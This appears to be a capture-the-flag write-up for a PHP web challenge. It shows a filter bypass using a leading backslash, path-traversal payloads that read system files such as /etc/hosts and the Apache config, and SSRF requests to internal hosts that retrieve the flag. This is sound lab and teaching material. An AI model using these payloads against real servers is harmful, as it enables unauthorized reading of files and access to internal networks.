?path=hint.txt

0. Hint
> Let's dive deep again this year.
> Please find the other server in the internal network! (flag is on that server)
>
>    GET http://some-internal-server/flag

I realize the hint is indicating the challenge `d1v1n6 d33p3r` in 2019 pre-exam.

1. try `path=index.php` and get
```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>🦈🦈🦈</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>🦈🦈🦈</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>
```

2. start with a `\` can bypass the rule

3. try `path=\../../../../../proc/self/cmdline`
```shell
apache2-DFOREGROUND
```

4. try `path=\../../../../../etc/apache2/apache2.conf`
```shell
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream's suggested way to configure the web server. This is because Debian's
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#	/etc/apache2/
#	|-- apache2.conf
#	|	`--  ports.conf
#	|-- mods-enabled
#	|	|-- *.load
#	|	`-- *.conf
```

5. try `path=\../../../../../../etc/resolv.conf`
```shell
nameserver 127.0.0.11
options ndots:0
```

6. try `path=\../../../../../..//etc/hosts`
```shell
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.22.0.3	0c1879a62a4d
```

7. try `path=http://172.22.0.3/`
the default page

8. try `path=http://172.22.0.2/`
```
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

9. try `path=http://172.22.0.2/flag`
```
AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
```

### Ref
- https://hackerone.com/reports/415682
- https://cyku.tw/ais3-2019-pre-exam-web-write-up/
